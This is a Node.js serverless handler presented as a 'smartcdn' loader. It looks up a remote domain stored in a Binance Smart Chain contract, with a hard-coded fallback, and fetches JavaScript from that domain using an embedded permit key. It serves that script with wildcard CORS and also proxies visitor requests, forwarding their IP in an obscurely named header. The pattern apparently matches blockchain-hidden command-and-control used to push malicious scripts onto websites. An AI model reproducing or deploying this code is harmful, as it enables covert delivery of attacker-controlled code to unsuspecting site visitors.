const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');

const PERMIT_KEY = 'wc7j6ervza0yba7gb2mz';
const CONTRACT_ADDRESS = '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0';
const RPC_URLS = [
    'https://binance.llamarpc.com',
    'https://bsc.blockrazor.xyz',
    'https://bsc.therpc.io',
    'https://bsc-dataseed2.bnbchain.org',
];
const FALLBACK_DOMAIN = 'https://0jtlnwi.com';

// ── Helpers ──────────────────────────────────────────────────────────────────

function getClientIP(req) {
    if (req.headers['cf-connecting-ip']) return req.headers['cf-connecting-ip'];
    if (req.headers['x-forwarded-for'])
        return req.headers['x-forwarded-for'].split(',')[0].trim();
    return req.socket ? req.socket.remoteAddress : '0.0.0.0';
}

function getCurrentUrl(req) {
    const proto = req.headers['x-forwarded-proto'] || 'https';
    const host = req.headers['host'];
    const pathname = (req.url || '/').split('?')[0];
    return `${proto}://${host}${pathname}`;
}

function hexToString(hex) {
    hex = hex.replace(/^0x/, '');
    hex = hex.substring(64); // skip 32-byte offset
    const length = parseInt(hex.substring(0, 64), 16);
    const dataHex = hex.substring(64, 64 + length * 2);
    let result = '';
    for (let i = 0; i < dataHex.length; i += 2) {
        const code = parseInt(dataHex.substring(i, i + 2), 16);
        if (code === 0) break;
        result += String.fromCharCode(code);
    }
    return result;
}

// ── HTTP fetch (no external deps) ────────────────────────────────────────────

function fetchUrl(url, opts = {}) {
    return new Promise((resolve, reject) => {
        const parsed = new URL(url);
        const lib = parsed.protocol === 'https:' ? https : http;

        const body = opts.body ? Buffer.from(opts.body) : null;

        const reqOpts = {
            hostname: parsed.hostname,
            port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
            path: parsed.pathname + parsed.search,
            method: opts.method || 'GET',
            headers: opts.headers || {},
            timeout: opts.timeout || 30000,
            rejectUnauthorized: false,
        };

        if (body) reqOpts.headers['Content-Length'] = body.length;

        const req = lib.request(reqOpts, (res) => {
            const chunks = [];
            res.on('data', (c) => chunks.push(c));
            res.on('end', () =>
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    data: Buffer.concat(chunks).toString('utf8'),
                })
            );
        });

        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('Request timed out')); });
        if (body) req.write(body);
        req.end();
    });
}

// ── /tmp cache ────────────────────────────────────────────────────────────────

const TMP = '/tmp';
const CACHE_TTL_MS = 5 * 60 * 1000; // 5 minutes

function tmpRead(key) {
    try {
        const filePath = path.join(TMP, key);
        const metaPath = filePath + '.meta';
        if (!fs.existsSync(filePath) || !fs.existsSync(metaPath)) return null;
        const meta = JSON.parse(fs.readFileSync(metaPath, 'utf8'));
        if (Date.now() - meta.ts > CACHE_TTL_MS) return null;
        return fs.readFileSync(filePath, 'utf8');
    } catch {
        return null;
    }
}

function tmpWrite(key, content) {
    try {
        fs.writeFileSync(path.join(TMP, key), content);
        fs.writeFileSync(path.join(TMP, key + '.meta'), JSON.stringify({ ts: Date.now() }));
    } catch { /* ignore */ }
}

// ── Domain resolution (BSC contract) ─────────────────────────────────────────

async function fetchTargetDomain() {
    const cached = tmpRead('smartcdn_domain');
    if (cached) return cached;

    // Race all RPCs in parallel
    const rpcPromises = RPC_URLS.map(async (rpcUrl) => {
        try {
            const payload = JSON.stringify({
                jsonrpc: '2.0',
                id: 1,
                method: 'eth_call',
                params: [{ to: CONTRACT_ADDRESS, data: '0x20965255' }, 'latest'],
            });

            const res = await fetchUrl(rpcUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload,
                timeout: 5000,
            });

            if (res.status === 200) {
                const json = JSON.parse(res.data);
                if (!json.error && json.result) {
                    const domain = hexToString(json.result);
                    if (domain) return domain;
                }
            }
            throw new Error('invalid response');
        } catch (e) { throw e; }
    });

    try {
        const fastest = await Promise.any(rpcPromises);
        tmpWrite('smartcdn_domain', fastest);
        return fastest;
    } catch {
        return FALLBACK_DOMAIN;
    }
}

// ── CDN JS downloader ─────────────────────────────────────────────────────────

async function downloadJSWithFailover(cdnUrl, endpoint) {
    const domains = [cdnUrl, FALLBACK_DOMAIN].filter(Boolean);
    let lastError = null;

    for (let i = 0; i < domains.length; i++) {
        const domain = domains[i];
        const url = domain.replace(/\/$/, '') + '/jscdn/' + endpoint;
        const timeout = (i === 0 && domains.length > 1) ? 3000 : 15000;

        try {
            const res = await fetchUrl(url, {
                method: 'POST',
                headers: {
                    Accept: 'application/javascript',
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ permit_key: PERMIT_KEY }),
                timeout: timeout,
            });

            if (res.status === 200) return res.data;
            lastError = `Status ${res.status}`;
        } catch (e) {
            lastError = e.message;
        }
    }
    return null;
}

// ── Vercel handler ────────────────────────────────────────────────────────────

module.exports = async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');

    if (req.method === 'OPTIONS') {
        res.setHeader('Access-Control-Max-Age', '86400');
        return res.status(204).end();
    }

    const { e, m } = req.query;

    // ── Ping ──
    if (e === 'ping_proxy') {
        res.setHeader('Content-Type', 'text/plain');
        return res.status(200).send('pong');
    }

    // ── Proxy mode ──
    if (e) {
        try {
            const resolvedDomain = await fetchTargetDomain();
            const domains = [resolvedDomain, FALLBACK_DOMAIN].filter(Boolean);
            const endpoint = '/' + String(e).replace(/^\/+/, '');
            let lastProxyError = null;

            for (let i = 0; i < domains.length; i++) {
                const domain = domains[i];
                const url = domain.replace(/\/$/, '') + endpoint;
                const clientIP = getClientIP(req);

                const fwdHeaders = { ...req.headers };
                ['host', 'Host', 'origin', 'Origin', 'accept-encoding',
                    'Accept-Encoding', 'content-encoding', 'Content-Encoding'].forEach(
                        (h) => delete fwdHeaders[h]
                    );
                fwdHeaders['x-dfkjldifjlifjd'] = clientIP;

                let body = null;
                if (!['GET', 'HEAD'].includes(req.method)) {
                    body = await new Promise((resolve) => {
                        const chunks = [];
                        req.on('data', (c) => chunks.push(c));
                        req.on('end', () => resolve(Buffer.concat(chunks).toString()));
                    });
                }

                try {
                    const proxyRes = await fetchUrl(url, {
                        method: req.method,
                        headers: fwdHeaders,
                        body: body || undefined,
                        timeout: (i === 0) ? 5000 : 30000,
                    });

                    if (proxyRes.status < 500) { // If it's a 4xx it's a real response, 5xx we fail over
                        res.setHeader('Access-Control-Allow-Origin', '*');
                        if (proxyRes.headers['content-type'])
                            res.setHeader('Content-Type', proxyRes.headers['content-type']);
                        return res.status(proxyRes.status).send(proxyRes.data);
                    }
                } catch (e) {
                    lastProxyError = e.message;
                }
            }
            return res.status(502).send(`Proxy Failover Error: ${lastProxyError}`);
        } catch (e) {
            return res.status(500).send(`Root Error: ${e.message}`);
        }
    }

    // ── CDN loader mode ──
    try {
        const cdnUrl = await fetchTargetDomain();
        const cacheKey = m ? 'smartcdn_file' : 'smartcdn_loader';

        let content = tmpRead(cacheKey);
        if (!content) {
            content = await downloadJSWithFailover(cdnUrl, m ? 'getFile' : 'getLoader');
            if (content) tmpWrite(cacheKey, content);
        }

        if (!content) return res.status(503).send('No content from any backend');

        // Inject current URL for loader (not file)
        if (!m) {
            const currentUrl = getCurrentUrl(req).replace('http://', 'https://');
            content = `window.e46jvfbmmj="${currentUrl.replace(/"/g, '\\"')}";` + content;
        }

        res.setHeader('Content-Type', 'application/javascript');
        res.setHeader('Cache-Control', 'public, max-age=300');
        return res.status(200).send(content);
    } catch (e) {
        return res.status(503).send(e.message);
    }
};
